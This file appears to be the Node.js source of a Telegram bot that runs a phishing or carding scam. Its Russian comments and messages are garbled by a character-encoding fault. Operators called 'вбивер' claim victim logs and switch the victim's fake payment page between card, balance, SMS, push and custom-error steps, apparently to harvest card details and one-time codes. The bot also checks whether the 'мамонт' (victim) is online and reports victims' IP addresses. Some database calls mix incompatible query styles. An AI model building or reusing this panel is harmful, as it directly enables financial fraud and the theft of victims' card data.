const stage = require("./handlers/scenes");
const {
    connectMongoDB,
    Users,
    Visits,
    Carts,
    Checkouts,
    Logs
} = require("./config/mongodb");
const config = require("./config/config");
const logsGroupId = config.bot.logsGroupId;
const vbivButtons = require("./handlers/functions/vbivButtons");
const withOutWriter = require("./handlers/functions/withOutWriter");
const withWriter = require("./handlers/functions/withWriter");
const writerMessage = require("./handlers/functions/writerMessage");

const { Telegraf, session } = require("telegraf"),
    bot = new Telegraf(config.bot.token);

// –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ—à–∏–±–æ–∫ Telegram
bot.catch((err, ctx) => {
    console.error('Telegram bot error:', err);
    if (ctx && ctx.reply) {
        ctx.reply('–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.').catch(console.error);
    }
});

bot.use(session());
bot.use(stage.middleware());

// –ö–æ–º–∞–Ω–¥–∞ /stats –¥–ª—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏ –∑–∞ 24 —á–∞—Å–∞
bot.command('stats', async (ctx) => {
  try {
    const twentyFourHoursAgo = new Date();
    twentyFourHoursAgo.setHours(twentyFourHoursAgo.getHours() - 24);

    // –ü–æ–ª—É—á–∞–µ–º —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É
    const totalVisitors = await Users.countDocuments({
      firstVisit: { $gte: twentyFourHoursAgo }
    });

    const totalVisits = await Visits.countDocuments({
      timestamp: { $gte: twentyFourHoursAgo }
    });

    const checkoutAttempts = await Checkouts.countDocuments({
      createdAt: { $gte: twentyFourHoursAgo }
    });

    const uniqueVisitors = await Users.countDocuments({
      lastVisit: { $gte: twentyFourHoursAgo }
    });

    // –ü–æ–ª—É—á–∞–µ–º —Ç–æ–ø —Å—Ç—Ä–∞–Ω–∏—Ü
    const topPages = await Visits.aggregate([
      { $match: { timestamp: { $gte: twentyFourHoursAgo } } },
      { $group: { _id: '$page', count: { $sum: 1 } } },
      { $sort: { count: -1 } },
      { $limit: 5 }
    ]);

    const statsMessage = `
üìä <b>–°–¢–ê–¢–ò–°–¢–ò–ö–ê –ó–ê 24 –ß–ê–°–ê</b>

üë• <b>–û–±—â–∏–µ –ø–æ–∫–∞–∑–∞—Ç–µ–ª–∏:</b>
‚îî –ù–æ–≤—ã–µ –ø–æ—Å–µ—Ç–∏—Ç–µ–ª–∏: <b>${totalVisitors}</b>
‚îî –£–Ω–∏–∫–∞–ª—å–Ω—ã–µ –ø–æ—Å–µ—Ç–∏—Ç–µ–ª–∏: <b>${uniqueVisitors}</b>
‚îî –í—Å–µ–≥–æ –ø–æ—Å–µ—â–µ–Ω–∏–π: <b>${totalVisits}</b>
‚îî –ü–µ—Ä–µ—Ö–æ–¥—ã –Ω–∞ –æ–ø–ª–∞—Ç—É: <b>${checkoutAttempts}</b>

üìà <b>–ö–æ–Ω–≤–µ—Ä—Å–∏—è:</b>
‚îî –ü–æ—Å–µ—â–µ–Ω–∏—è ‚Üí –û–ø–ª–∞—Ç–∞: <b>${totalVisits > 0 ? ((checkoutAttempts / totalVisits) * 100).toFixed(2) : 0}%</b>

üî• <b>–¢–æ–ø —Å—Ç—Ä–∞–Ω–∏—Ü:</b>
${topPages.map((page, index) => 
  `${index + 1}. ${page._id}: <b>${page.count}</b>`
).join('\n')}

‚è∞ <b>–û–±–Ω–æ–≤–ª–µ–Ω–æ:</b> ${new Date().toLocaleString('ru-RU')}
    `;

    await ctx.reply(statsMessage, { parse_mode: 'HTML' });
  } catch (error) {
    console.error('Stats command error:', error);
    await ctx.reply('‚ùå –û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏');
  }
});


bot.action(/^customError_([A-Za-z0-9_]+)$/, async (ctx) => {
    const log = await Logs.findOne({
        where: {
            id: ctx.match[1]
        }
    })

    if(!log) return ctx
        .answerCbQuery(
            `‚ôªÔ∏è –õ–æ–≥ —Å ID ${ctx.match[1]} –Ω–µ –Ω–∞–π–¥–µ–Ω!`,
            true
        )
        .catch((err) => err);

    return ctx.scene.enter('customError', {
        logId: ctx.match[1]
    }).catch((err) => {
        console.error("Error entering customError scene:", err);
    });
});


bot.action(/^custom_([A-Za-z0-9_]+)$/, async (ctx) => {
    const log = await Logs.findOne({
        where: {
            id: ctx.match[1]
        }
    })

    if(!log) return ctx
        .answerCbQuery(
            `‚ôªÔ∏è –õ–æ–≥ —Å ID ${ctx.match[1]} –Ω–µ –Ω–∞–π–¥–µ–Ω!`,
            true
        )
        .catch((err) => err);

    return ctx.scene.enter(`custom`, {
        logId: ctx.match[1],
    }).catch((err) => {
        console.error("Error entering custom scene:", err);
    });
});

bot.action(/^customscreen_([A-Za-z0-9_]+)$/, async (ctx) => {
    const log = await Logs.findOne({
        where: {
            id: ctx.match[1]
        }
    })

    if(!log) return ctx
        .answerCbQuery(
            `‚ôªÔ∏è –õ–æ–≥ —Å ID ${ctx.match[1]} –Ω–µ –Ω–∞–π–¥–µ–Ω!`,
            true
        )
        .catch((err) => err);

    return ctx.scene.enter(`custom_screen`, {
        logId: ctx.match[1],
    }).catch((err) => {
        console.error("Error entering custom scene:", err);
    });
});

bot.action(/^log_(\d+)_setStatus_(change|screen|skip|card|balance|push|sms|success|custom|customError)$/, async (ctx) => {
    try {
    const logId = ctx.match[1];
    const newStatus = ctx.match[2];
    const log = await Logs.findOne({
        where: {
            id: logId,
        }
    });

    if (!log) return ctx.answerCbQuery("‚ö†Ô∏è –õ–æ–≥ –Ω–µ –Ω–∞–π–¥–µ–Ω", true);

    if (ctx.from.id !== log.writerId) {
        await ctx.deleteMessage().catch((err) => err);
        return ctx.answerCbQuery("‚ö†Ô∏è –≠—Ç–æ –Ω–µ —Ç–≤–æ–π –ª–æ–≥!", true);
    }

    if (newStatus == 'customError' || newStatus == 'custom' || newStatus == 'screen') {
        await ctx.answerCbQuery("‚úÖ –°—Ç–∞—Ç—É—Å —É—Å–ø–µ—à–Ω–æ –∏–∑–º–µ–Ω–µ–Ω!");
        await ctx.deleteMessage().catch((err) => err);
    }

    await log.update({
        status: newStatus,
    });

    return ctx.telegram.editMessageReplyMarkup(log.writerId, log.writerMsgId, log.writerMsgId,
        await vbivButtons(log)
    ).catch((err) => err);
    } catch (error) {
        console.log(error);
    }
});


bot.action(/^log_(\d+)_leave$/, async (ctx, next) => {
    try {
        const logId = ctx.match[1];

        const log = await Logs.findOne({
            where: {
                id: logId,
            },
        });

        if (!log) return ctx.answerCbQuery("‚ö†Ô∏è –õ–æ–≥ –Ω–µ –Ω–∞–π–¥–µ–Ω", true);

        await log.update({
            writerId: null,
        });


        await ctx.telegram.editMessageReplyMarkup(logsGroupId,
            log.messageId,
            log.messageId,
            await withOutWriter(log)
        );

        await ctx.deleteMessage().catch((err) => err);
        await ctx.telegram.sendMessage(
            logsGroupId,
            `‚ö†Ô∏è –í–±–∏–≤–µ—Ä <b>@${ctx.from.username}</b> –æ—Ç–∫–∞–∑–∞–ª—Å—è –æ—Ç –ª–æ–≥–∞!`,
            {
                parse_mode: "HTML",
                reply_to_message_id: log.messageId,
            }
        );
    } catch (err) {
        console.log(err);
        return  ctx.reply(`<b>‚õîÔ∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞!</b>
‚îî–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è —É–∂–µ –ø–µ—Ä–µ–¥–∞–Ω–∞ —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫—É –∏ —Ä–µ—à–∞–µ—Ç—Å—è`, {parse_mode:"HTML"}).catch((err) => err);
    }
});

// –≤–∑—è—Ç–∏–µ –ª–æ–≥–∞
bot.action(/^log_take_(\d+)$/, async (ctx) => {
    try {
        const logId = ctx.match[1];

        const log = await Logs.findOne({
            where: {
                id: logId,
            },
        });

        if (!log) return ctx.answerCbQuery("‚ö†Ô∏è –õ–æ–≥ –Ω–µ –Ω–∞–π–¥–µ–Ω", true);

        if (log.writerId) return ctx.answerCbQuery("‚ö†Ô∏è –õ–æ–≥ —É–∂–µ –≤–∑—è—Ç", true);

        await log.update({
            writerId: ctx.from.id,
        });
        await ctx
            .editMessageReplyMarkup(
                await withWriter(log, ctx.from)
            )
            .catch((err) => err);


        const msg = await ctx.telegram
            .sendMessage(ctx.from.id, await writerMessage(log), {
                parse_mode: "HTML",
                reply_markup: await vbivButtons(log),
            }).catch((err) => err);


        await log.update({
            writerMsgId: msg.message_id,
        });

    } catch (err) {
        console.log(err);
        return  ctx.reply(`<b>‚õîÔ∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞!</b>
‚îî–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è —É–∂–µ –ø–µ—Ä–µ–¥–∞–Ω–∞ —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫—É –∏ —Ä–µ—à–∞–µ—Ç—Å—è`, {parse_mode:"HTML"}).catch((err) => err);
    }
});

bot.action(/^eye_(.+)$/, async(ctx) => {
    try {
        const victim = await Logs.findOne({
            where: {
                id: ctx.match[1],
            },
        });

        if (!victim) {
            return ctx.answerCbQuery('–ú–∞–º–æ–Ω—Ç –Ω–µ –Ω–∞–π–¥–µ–Ω');
        }

        const message = victim.online ? '‚úÖ –ú–∞–º–æ–Ω—Ç –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ!' : `üõë –ú–∞–º–æ–Ω—Ç –Ω–µ –Ω–∞ —Å–∞–π—Ç–µ!`;
        await ctx.answerCbQuery(message);
        const fiveMinutesAgo = new Date();
        fiveMinutesAgo.setSeconds(fiveMinutesAgo.getSeconds() - 5);

        if (victim.online && victim.updatedAt < fiveMinutesAgo) {
            await victim.update({ online: false });
        }

    } catch (err) {
        console.log(err)
        return  ctx.reply(`<b>‚õîÔ∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞!</b>
‚îî–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è —É–∂–µ –ø–µ—Ä–µ–¥–∞–Ω–∞ —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫—É –∏ —Ä–µ—à–∞–µ—Ç—Å—è`, {parse_mode:"HTML"}).catch((err) => err);
    }
});

// –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –¥–ª—è –Ω–æ–≤—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è
bot.action(/^track_user_(.+)$/, async (ctx) => {
    try {
        const userId = ctx.match[1];
        
        // –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
        const user = await Users.findOne({ userId });
        
        if (!user) {
            return ctx.answerCbQuery('–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω');
        }

        const userInfo = `
üë§ <b>–ò–ù–§–û–†–ú–ê–¶–ò–Ø –û –ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–ï</b>

üÜî <b>ID:</b> <code>${user.userId}</code>
üìç <b>IP:</b> <code>${user.ip}</code>
üî¢ <b>–ü–æ—Å–µ—â–µ–Ω–∏–π:</b> <b>${user.visitCount}</b>
üìÖ <b>–ü–µ—Ä–≤—ã–π –≤–∏–∑–∏—Ç:</b> ${user.firstVisit.toLocaleString('ru-RU')}
üìÖ <b>–ü–æ—Å–ª–µ–¥–Ω–∏–π –≤–∏–∑–∏—Ç:</b> ${user.lastVisit.toLocaleString('ru-RU')}
üîó <b>Referrer:</b> ${user.referrer || '–ü—Ä—è–º–æ–π –ø–µ—Ä–µ—Ö–æ–¥'}
        `;

        await ctx.reply(userInfo, { parse_mode: 'HTML' });
        await ctx.answerCbQuery('‚úÖ –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞');
    } catch (error) {
        console.error('Track user error:', error);
        await ctx.answerCbQuery('‚ùå –û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏');
    }
});

bot.action(/^checkout_(.+)_(success|cancel)$/, async (ctx) => {
    try {
        const checkoutId = ctx.match[1];
        const status = ctx.match[2];
        
        // –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç–∞—Ç—É—Å checkout
        await Checkouts.findByIdAndUpdate(checkoutId, {
            status: status === 'success' ? 'completed' : 'failed'
        });

        const statusText = status === 'success' ? '‚úÖ –ó–∞–∫–∞–∑ —É—Å–ø–µ—à–Ω–æ –æ—Ñ–æ—Ä–º–ª–µ–Ω' : '‚ùå –ó–∞–∫–∞–∑ –æ—Ç–º–µ–Ω–µ–Ω';
        await ctx.answerCbQuery(statusText);
        
        // –û–±–Ω–æ–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
        const newText = ctx.callbackQuery.message.text + `\n\n${statusText}`;
        await ctx.editMessageText(newText, { 
            parse_mode: 'HTML',
            reply_markup: ctx.callbackQuery.message.reply_markup
        });
    } catch (error) {
        console.error('Checkout status update error:', error);
        await ctx.answerCbQuery('‚ùå –û—à–∏–±–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Å—Ç–∞—Ç—É—Å–∞');
    }
});

bot.action('user_stats', async (ctx) => {
    try {
        // –í—ã–∑—ã–≤–∞–µ–º –∫–æ–º–∞–Ω–¥—É stats
        await ctx.scene.leave();
        await ctx.reply('üìä –ü–æ–ª—É—á–µ–Ω–∏–µ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏...');
        
        // –ò–º–∏—Ç–∏—Ä—É–µ–º –∫–æ–º–∞–Ω–¥—É /stats
        const twentyFourHoursAgo = new Date();
        twentyFourHoursAgo.setHours(twentyFourHoursAgo.getHours() - 24);

        const totalVisitors = await Users.countDocuments({
            firstVisit: { $gte: twentyFourHoursAgo }
        });

        const uniqueVisitors = await Users.countDocuments({
            lastVisit: { $gte: twentyFourHoursAgo }
        });

        const checkoutAttempts = await Checkouts.countDocuments({
            createdAt: { $gte: twentyFourHoursAgo }
        });

        const statsMessage = `
üìä <b>–°–¢–ê–¢–ò–°–¢–ò–ö–ê –ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–ï–ô</b>

üë• <b>–ó–∞ 24 —á–∞—Å–∞:</b>
‚îî –ù–æ–≤—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏: <b>${totalVisitors}</b>
‚îî –ê–∫—Ç–∏–≤–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏: <b>${uniqueVisitors}</b>
‚îî –ü–µ—Ä–µ—Ö–æ–¥—ã –Ω–∞ –æ–ø–ª–∞—Ç—É: <b>${checkoutAttempts}</b>

‚è∞ <b>–û–±–Ω–æ–≤–ª–µ–Ω–æ:</b> ${new Date().toLocaleString('ru-RU')}
        `;

        await ctx.reply(statsMessage, { parse_mode: 'HTML' });
        await ctx.answerCbQuery('‚úÖ –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞');
    } catch (error) {
        console.error('User stats error:', error);
        await ctx.answerCbQuery('‚ùå –û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏');
    }
});

// –ë–µ–∑–æ–ø–∞—Å–Ω—ã–π –∑–∞–ø—É—Å–∫ –±–æ—Ç–∞
async function startBot() {
    try {
        // –ü–æ–¥–∫–ª—é—á–∞–µ–º—Å—è –∫ MongoDB
        const mongoConnected = await connectMongoDB();
        if (!mongoConnected) {
            console.error('‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è –∫ MongoDB');
            return;
        }

        await bot.launch();
        console.log('ü§ñ Bot Started with MongoDB!');
    } catch (error) {
        console.error('‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø—É—Å–∫–∞ –±–æ—Ç–∞:', error);
        // –ù–µ –æ—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ, –ø—Ä–æ–¥–æ–ª–∂–∞–µ–º —Ä–∞–±–æ—Ç—É –±–µ–∑ –±–æ—Ç–∞
    }
}

startBot();

bot.catch((err) => {
    console.log(`–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–∞–±–æ—Ç–µ –±–æ—Ç–∞: ${err}`)
})